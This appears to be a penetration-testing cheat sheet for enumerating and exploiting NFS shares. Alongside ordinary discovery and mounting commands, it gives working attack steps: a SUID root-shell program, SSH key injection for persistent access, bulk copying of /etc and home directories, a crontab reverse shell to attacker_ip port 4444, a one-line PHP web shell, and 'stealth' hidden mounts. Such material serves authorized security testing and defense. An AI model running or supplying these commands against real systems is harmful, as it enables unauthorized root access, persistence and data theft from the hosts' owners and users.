# NFS Enumeration Cheat Sheet

## Table of Contents
1. [Overview](#overview)
2. [Ports & Protocols](#ports--protocols)
3. [Quick Discovery](#quick-discovery)
4. [Essential Enumeration Workflow](#essential-enumeration-workflow)
   - [Share Discovery](#1-share-discovery)
   - [Mounting NFS Shares](#2-mounting-nfs-shares)
   - [File Analysis](#3-file-analysis)
5. [Exploitation Techniques](#exploitation-techniques)
   - [Writable Share Exploitation](#writable-share-exploitation)
   - [Root Squash Bypass](#root-squash-bypass)
   - [UID/GID Manipulation](#uidgid-manipulation)
   - [Privilege Escalation](#privilege-escalation)
6. [Persistence & Data Extraction](#persistence--data-extraction)
7. [Common Misconfigurations](#common-misconfigurations)
8. [Quick Reference Commands](#quick-reference-commands)
9. [Testing Checklist](#testing-checklist)
10. [Critical Vulnerabilities](#critical-vulnerabilities)

---

## Overview

**NFS (Network File System)** is a distributed file system protocol that allows remote file access over a network as if files were local. Developed by Sun Microsystems, it's primarily used between Linux/Unix systems.

### Key Functions
- **Remote File Access**: Mount remote filesystems locally
- **Transparent Access**: Files appear as local to applications
- **Network Sharing**: Cross-platform file sharing in Unix environments
- **Distributed Storage**: Centralized file storage with network access

### Why NFS Matters in Pentesting
- **Weak Authentication**: Often relies on IP-based access control
- **UID/GID Mapping**: Client-side user ID mapping can be manipulated
- **Privilege Escalation**: Misconfigured shares allow root access
- **Data Exposure**: Sensitive files often shared without proper restrictions
- **Legacy Issues**: Older versions lack proper security controls

### Common Attack Vectors
- **Anonymous Access**: IP-based restrictions can be bypassed
- **UID Spoofing**: Create local users with target UIDs for access
- **Root Squash Bypass**: Exploit `no_root_squash` configurations
- **Writable Shares**: Upload malicious files, backdoors, SUID binaries
- **Information Disclosure**: Extract sensitive data from exposed shares

---

## Ports & Protocols
```
111/tcp,udp - RPCbind/Portmapper (ONC-RPC/SUN-RPC)
2049/tcp,udp - NFS (Network File System)
```

### NFS Versions
| Version | Features | Security |
|---------|----------|----------|
| NFSv2 | Legacy, UDP only | No authentication |
| NFSv3 | Better performance, TCP/UDP | Machine-based auth |
| NFSv4 | Kerberos, stateful, port 2049 only | User authentication |
| NFSv4.1 | Cluster support, performance improvements | Enhanced security |

---

## Quick Discovery
```bash
# Port scan
nmap -p 111,2049 --open -sV target

# NFS-specific scan with scripts
nmap -p 111,2049 --script=nfs-ls,nfs-showmount,nfs-statfs target

# Comprehensive NFS enumeration
nmap --script nfs* -p 111,2049 -sV target
```

---

## Essential Enumeration Workflow

### 1. Share Discovery

#### RPC Information Gathering
```bash
# Query RPC services
rpcinfo -p target
# Shows all RPC services including NFS-related ones

# Alternative RPC query
rpcinfo -t target nfs
```

#### NFS Share Enumeration
```bash
# List exported NFS shares
showmount -e target

# List all mount points
showmount -a target

# List directories being mounted
showmount -d target
```

### 2. Mounting NFS Shares

#### Basic Mounting
```bash
# Create mount point
mkdir /mnt/nfs_target

# Mount NFS share
sudo mount -t nfs target:/exported/path /mnt/nfs_target

# Mount with nolock option (common requirement)
sudo mount -t nfs target:/exported/path /mnt/nfs_target -o nolock
```

#### Advanced Mounting Options
```bash
# Mount with specific UID (bypass restrictions)
sudo mount -o nolock,uid=1000 target:/share /mnt/nfs_target

# Mount with specific GID
sudo mount -o nolock,gid=1000 target:/share /mnt/nfs_target

# Mount with rw permissions
sudo mount -o rw,nolock target:/share /mnt/nfs_target

# Check mounted shares
mount | grep nfs
```

### 3. File Analysis

#### Permission Analysis
```bash
# List with usernames/groups
ls -l /mnt/nfs_target/

# List with UID/GID numbers
ls -n /mnt/nfs_target/

# Recursive listing
find /mnt/nfs_target -ls
```

#### Content Discovery
```bash
# Search for interesting files
find /mnt/nfs_target -type f -name "*.key"
find /mnt/nfs_target -type f -name "*.conf"
find /mnt/nfs_target -type f -name "*password*"
find /mnt/nfs_target -type f -name "*backup*"

# Check for SUID files
find /mnt/nfs_target -type f -perm -4000 -ls
```

---

## Exploitation Techniques

### Writable Share Exploitation
```bash
# Test write permissions
echo "test content" > /mnt/nfs_target/test.txt

# VULNERABILITY: If successful, share allows unauthorized writes
# Upload malicious files
cp /path/to/webshell.php /mnt/nfs_target/
cp /path/to/backdoor /mnt/nfs_target/
```

### Root Squash Bypass
```bash
# Check if no_root_squash is enabled
# Create file as root and check ownership retention

sudo touch /mnt/nfs_target/root_test
ls -l /mnt/nfs_target/root_test

# If owner remains root (UID 0): VULNERABILITY - no_root_squash enabled
# This allows full root access to the share
```

### UID/GID Manipulation
```bash
# Create user with target UID
sudo useradd -u 1000 nfs_user

# Switch to target user
sudo su nfs_user

# Access files with matching UID
cat /mnt/nfs_target/user_file.txt

# Create user with UID 0 (if no_root_squash)
sudo useradd -u 0 fake_root
sudo su fake_root
```

### Privilege Escalation
```bash
# Create SUID binary for privilege escalation
# On writable NFS share, create SUID shell

cat > /mnt/nfs_target/shell.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
int main(void) {
    setuid(0);
    setgid(0);
    system("/bin/bash");
    return 0;
}
EOF

# Compile and set SUID (requires root access on NFS server)
gcc /mnt/nfs_target/shell.c -o /mnt/nfs_target/shell
chmod u+s /mnt/nfs_target/shell

# Execute on target system for privilege escalation
```

---

## Persistence & Data Extraction

### SSH Key Injection
```bash
# Access user home directories via NFS
# Inject SSH public key for persistent access

mkdir -p /mnt/nfs_target/home/user/.ssh/
echo "ssh-rsa AAAAB3... attacker@kali" >> /mnt/nfs_target/home/user/.ssh/authorized_keys
chmod 600 /mnt/nfs_target/home/user/.ssh/authorized_keys

# SSH into target system
ssh user@target
```

### Data Exfiltration
```bash
# Recursive file reading
find /mnt/nfs_target -type f -exec cat {} \; > extracted_data.txt

# Copy sensitive files
cp -r /mnt/nfs_target/etc/ ./nfs_etc_backup/
cp -r /mnt/nfs_target/home/ ./nfs_home_backup/

# Search for specific content
grep -r "password" /mnt/nfs_target/
grep -r "secret" /mnt/nfs_target/
```

### Backdoor Placement
```bash
# Place cron job backdoor
echo "* * * * * /bin/bash -i >& /dev/tcp/attacker_ip/4444 0>&1" >> /mnt/nfs_target/etc/crontab

# Web application backdoor
echo '<?php system($_GET["cmd"]); ?>' > /mnt/nfs_target/var/www/html/shell.php
```

---

## Common Misconfigurations

### High-Risk NFS Export Options
```bash
# Check /etc/exports for dangerous settings:
# rw - Read/write access
# no_root_squash - Root privileges retained
# insecure - Ports above 1024 allowed
# nohide - Exposes mounted filesystems

# Example dangerous export:
# /home *(rw,no_root_squash,insecure)
```

### Configuration Analysis
```bash
# View export configuration (if accessible)
cat /mnt/nfs_target/etc/exports

# Check for world-writable directories
find /mnt/nfs_target -type d -perm -o+w -ls

# Look for backup files
find /mnt/nfs_target -name "*.bak" -o -name "*.backup" -o -name "*~"
```

---

## Quick Reference Commands

### Discovery
```bash
nmap -p 111,2049 --script nfs* target
rpcinfo -p target
showmount -e target
```

### Mounting
```bash
mkdir /mnt/nfs_target
sudo mount -t nfs target:/share /mnt/nfs_target -o nolock
mount | grep nfs
```

### Analysis
```bash
ls -la /mnt/nfs_target/
find /mnt/nfs_target -type f -perm -4000
grep -r "password" /mnt/nfs_target/
```

### Cleanup
```bash
cd /
sudo umount /mnt/nfs_target
rmdir /mnt/nfs_target
```

---

## Testing Checklist

#### Discovery
- [ ] Port 111/2049 open and accessible
- [ ] RPC services enumeration
- [ ] NFS version identification
- [ ] Share listing via showmount

#### Access Testing
- [ ] Anonymous share mounting
- [ ] Read access to mounted shares
- [ ] Write access testing
- [ ] File permission analysis

#### Configuration Assessment
- [ ] Export options analysis (/etc/exports)
- [ ] Root squash configuration
- [ ] Insecure port usage
- [ ] World-writable directories

#### Exploitation
- [ ] UID/GID manipulation attempts
- [ ] SUID binary creation (if writable)
- [ ] SSH key injection opportunities
- [ ] Backdoor placement feasibility

#### Data Assessment
- [ ] Sensitive file discovery
- [ ] Configuration file access
- [ ] User directory enumeration
- [ ] Backup file identification

---

## Critical Vulnerabilities

### Anonymous Share Access
- **Impact**: Unauthorized data access, information disclosure
- **Detection**: `showmount -e target` returns shares without authentication
- **Exploitation**: Mount shares and extract sensitive data

### No Root Squash
- **Impact**: Full root access to shared filesystem
- **Detection**: Files created as root retain root ownership
- **Exploitation**: Create SUID binaries, modify system files

### Writable World Shares
- **Impact**: File upload, backdoor deployment, data modification
- **Detection**: Successful file creation in mounted share
- **Exploitation**: Upload webshells, backdoors, persistence mechanisms

### UID/GID Bypass
- **Impact**: Access to user files, privilege escalation
- **Detection**: File access changes with UID modification
- **Exploitation**: Create local users with target UIDs for file access

### Information Disclosure
- **Impact**: Sensitive data exposure, credential harvesting
- **Detection**: Access to configuration files, user directories
- **Exploitation**: Extract passwords, SSH keys, application configs

---

## Advanced Techniques

### NFS Version Downgrade
```bash
# Force NFSv2 usage (weaker security)
sudo mount -t nfs -o vers=2 target:/share /mnt/nfs_target

# Force NFSv3 usage
sudo mount -t nfs -o vers=3 target:/share /mnt/nfs_target
```

### Network-Based Attacks
```bash
# NFS over UDP (potentially less secure)
sudo mount -t nfs -o udp target:/share /mnt/nfs_target

# Specify custom port
sudo mount -t nfs -o port=2049 target:/share /mnt/nfs_target
```

### Stealth Techniques
```bash
# Mount to hidden directory
mkdir /tmp/.nfs_hidden
sudo mount -t nfs target:/share /tmp/.nfs_hidden -o nolock

# Use soft mount (timeout on failure)
sudo mount -t nfs -o soft,timeo=1 target:/share /mnt/nfs_target
```